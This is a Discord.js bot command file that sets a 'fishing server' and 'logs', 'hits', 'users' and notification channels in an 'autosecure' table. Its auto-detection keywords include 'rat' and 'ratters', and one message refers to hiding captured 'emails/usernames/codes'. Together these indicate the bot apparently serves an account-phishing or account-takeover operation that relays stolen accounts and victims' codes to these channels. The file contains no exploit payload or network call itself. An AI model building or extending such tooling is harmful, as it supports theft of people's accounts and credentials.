const { ApplicationCommandOptionType, ChannelType } = require("discord.js");
const { queryParams } = require("../../../db/database");
const { EmbedBuilder } = require("discord.js");

module.exports = {
    name: "set",
    description: `Set your server and channels!`,
    sendembeds: true,
    options: [
        {
            name: "channel",
            description: "What do you want to set?",
            type: ApplicationCommandOptionType.String,
            required: true,
            choices: [
                { name: "--- Set Channels ----", value: "setchannels" },
                { name: "Server", value: "server" },
                { name: "Logs", value: "logs" },
                { name: "Hits", value: "hits" },
                { name: "Users", value: "users" },
                { name: "Notification Message", value: "notifications" },
                { name: "--------------------", value: "setchannels" },
                { name: "Auto-set (based on name)", value: "autoset" },
                { name: "Remove all channels", value: "remove_all" }
            ]
        },
    ],
    callback: async (client, interaction) => {
        if (!interaction.inGuild()) {
            return interaction.reply({
                content: `This command can only be used in a server.`,
                ephemeral: true,
            });
        }

        const userId = client.username;
        const guildId = interaction.guildId;
        const guild = interaction.guild;
        const choice = interaction.options.getString("channel");


function isLogChannel(name) {
    name = name.toLowerCase();
    return [
        "log", "logs", "logging", "loging", "logschannel", "logchannel",
        "audit", "audits", "modlog", "modlogs", "mod-log", "mod-logs",
        "adminlog", "adminlogs", "serverlog", "serverlogs", "eventlog", "eventlogs",
        "logg", "loggs", "logingg", "loggin" 
    ].some(word => name.includes(word));
}

function isNotiChannel(name) {
    name = name.toLowerCase();
    return [
        "noti", "notis", "notifications", "notify", "notifs", "notif",
        "notifyusers", "notifier", "alerts", "alert", "announcement", "announcements",
        "news", "updates", "broadcast", "broadcasts", "info", "infos",
        "notfications", "notificatons", "notificaitons", "notifcations"
    ].some(word => name.includes(word));
}

function isHitChannel(name) {
    name = name.toLowerCase();
    return [
        "hit", "hits", "hitchannel", "hitsch", "hitch", "hitchan", "hitchannels",
        "hitts", "hitss", "hitcannel", "hithchannel", "hith" 
    ].some(word => name.includes(word));
}

function isUserChannel(name) {
    name = name.toLowerCase();
    return [
        "user", "users", "userschannel", "userchannel", "rat", "ratters", "ratchannel",
        "usre", "usres", "usrchannel", "usrchan", "ratt", "ratter", "ratterrs" 
    ].some(word => name.includes(word));
}


        switch (choice) {
            case "setchannels":
                interaction.reply({
                    embeds: [new EmbedBuilder().setTitle("This isn't an option!").setColor(0xc8a2c8)],
                    ephemeral: true
                });
                break;

            case "server":
                await client.queryParams(`UPDATE autosecure SET server_id=? WHERE user_id=?`, [`${guildId}`, userId]);
                interaction.reply({ content: `Changed your fishing server`, ephemeral: true });
                break;

            case "logs":
                await client.queryParams(`UPDATE autosecure SET logs_channel=? WHERE user_id=?`, [`${interaction.channelId}|${guildId}`, userId]);
                interaction.reply({ content: `Changed your logs channel to <#${interaction.channelId}>`, ephemeral: true });
                interaction.channel.send({ content: `Will send logs in this channel!` });
                break;

            case "hits":
                await client.queryParams(`UPDATE autosecure SET hits_channel=? WHERE user_id=?`, [`${interaction.channelId}|${guildId}`, userId]);
                interaction.reply({ content: `Changed your hits channel to <#${interaction.channelId}>`, ephemeral: true });
                interaction.channel.send({ content: `Will send hits in this channel!` });
                break;

            case "notifications":
                await client.queryParams(`UPDATE autosecure SET notification_channel=? WHERE user_id=?`, [`${interaction.channelId}|${guildId}`, userId]);
                interaction.reply({ content: `Changed your notification channel to <#${interaction.channelId}>`, ephemeral: true });
                interaction.channel.send({ content: `Will send notifications to this channel!` });
                break;

            case "users":
                await client.queryParams(`UPDATE autosecure SET users_channel=? WHERE user_id=?`, [`${interaction.channelId}|${guildId}`, userId]);
                interaction.reply({ content: `Changed your users channel to <#${interaction.channelId}>`, ephemeral: true });
                interaction.channel.send({
                    content: `Will send messages for your user in this channel! The emails/usernames/codes will be hidden!`
                });
                break;

            case "remove_all":
                await client.queryParams(
                    `UPDATE autosecure SET server_id=NULL, logs_channel=NULL, hits_channel=NULL, notification_channel=NULL, users_channel=NULL WHERE user_id=?`,
                    [userId]
                );
                interaction.reply({ content: `Removed all your set channels.`, ephemeral: true });
                break;

            case "autoset":
                let logsSet = false;
                let hitsSet = false;
                let notisSet = false;
                let usersSet = false;
                let reply = [];

                await client.queryParams(`UPDATE autosecure SET server_id=? WHERE user_id=?`, [`${guildId}`, userId]);
                reply.push(`Server: Set to **${guild.name}**`);

                for (const channel of guild.channels.cache.values()) {
                    if (channel.type !== ChannelType.GuildText) continue;
                    const name = channel.name;

                    if (!logsSet && isLogChannel(name)) {
                        await client.queryParams(`UPDATE autosecure SET logs_channel=? WHERE user_id=?`, [`${channel.id}|${guildId}`, userId]);
                        reply.push(`Logs channel: Set to <#${channel.id}>`);
                        logsSet = true;
                        channel.send({ content: `Will send logs in this channel!` });
                    }

                    if (!hitsSet && isHitChannel(name)) {
                        await client.queryParams(`UPDATE autosecure SET hits_channel=? WHERE user_id=?`, [`${channel.id}|${guildId}`, userId]);
                        reply.push(`Hits channel: Set to <#${channel.id}>`);
                        hitsSet = true;
                        channel.send({ content: `Will send hits in this channel!` });
                    }

                    if (!notisSet && isNotiChannel(name)) {
                        await client.queryParams(`UPDATE autosecure SET notification_channel=? WHERE user_id=?`, [`${channel.id}|${guildId}`, userId]);
                        reply.push(`Notification channel: Set to <#${channel.id}>`);
                        notisSet = true;
                        channel.send({ content: `Will send notifications to this channel!` });
                    }

                    if (!usersSet && isUserChannel(name)) {
                        await client.queryParams(`UPDATE autosecure SET users_channel=? WHERE user_id=?`, [`${channel.id}|${guildId}`, userId]);
                        reply.push(`Users channel: Set to <#${channel.id}>`);
                        usersSet = true;
                        channel.send({ content: `Will send messages for your user in this channel! The emails/usernames/codes will be hidden!` });
                    }

                    if (logsSet && hitsSet && notisSet && usersSet) break;
                }

                if (!logsSet) reply.push(`Logs channel: Not found`);
                if (!hitsSet) reply.push(`Hits channel: Not found`);
                if (!notisSet) reply.push(`Notification channel: Not found`);
                if (!usersSet) reply.push(`Users channel: Not found`);

                interaction.reply({ content: reply.join("\n"), ephemeral: true });
                break;

            default:
                interaction.reply({ content: `Invalid option selected.`, ephemeral: true });
                break;
        }
    }
};
